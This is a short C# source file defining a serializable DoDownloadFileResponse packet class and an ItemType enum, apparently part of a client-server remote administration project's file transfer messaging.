using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    public enum ItemType
    {
        File,
        Directory
    }

    [Serializable]
    public class DoDownloadFileResponse : IPacket
    {
        public int ID { get; set; }

        public string Filename { get; set; }

        public byte[] Block { get; set; }

        public int MaxBlocks { get; set; }

        public int CurrentBlock { get; set; }

        public string CustomMessage { get; set; }

        public ItemType Type { get; set; }

        public DateTime StartTime { get; set; }

        public string RemotePath { get; set; }

        public DoDownloadFileResponse()
        {
        }

        public DoDownloadFileResponse(int id, string filename, byte[] block, int maxblocks, int currentblock,
            string custommessage, ItemType type, DateTime startTime, string remotePath = null)
        {
            this.ID = id;
            this.Filename = filename;
            this.Block = block;
            this.MaxBlocks = maxblocks;
            this.CurrentBlock = currentblock;
            this.CustomMessage = custommessage;
            this.Type = type;
            this.RemotePath = remotePath;
            this.StartTime = startTime;
        }

        public void Execute(Client client)
        {
            client.SendBlocking(this);
        }
    }
}